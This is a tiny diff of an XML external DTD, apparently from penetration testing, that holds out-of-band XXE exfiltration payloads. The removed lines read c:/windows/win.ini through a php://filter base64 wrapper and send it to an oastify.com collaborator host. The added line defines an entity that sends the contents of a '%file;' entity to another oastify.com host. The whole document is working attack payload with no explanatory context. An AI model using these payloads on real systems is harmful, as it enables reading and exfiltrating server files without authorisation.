@@ -1,3 +1,1 @@
-<?xml version=”1.0″ encoding=”utf-8″ ?>
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini">
-<!ENTITY % bravo "<!ENTITY % charlie SYSTEM 'http://okccg3z8bao1jzmcbv9iq9tyup0fo4.oastify.com/?%data;'>">
+<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://co4yo8zxmgtyic13t20lv06ae1kr8g.oastify.com?%file;'>"> %all;
